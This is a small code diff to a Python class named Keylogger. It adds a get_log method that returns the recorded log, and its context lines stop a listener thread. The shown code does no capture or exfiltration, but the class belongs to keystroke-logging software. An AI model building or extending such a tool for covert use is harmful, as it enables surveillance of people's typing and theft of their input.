@@ -38,3 +38,6 @@ class Keylogger:
             self._listener.stop()
             if self._thread:
                 self._thread.join()
+
+    def get_log(self) -> str:
+        return self.log
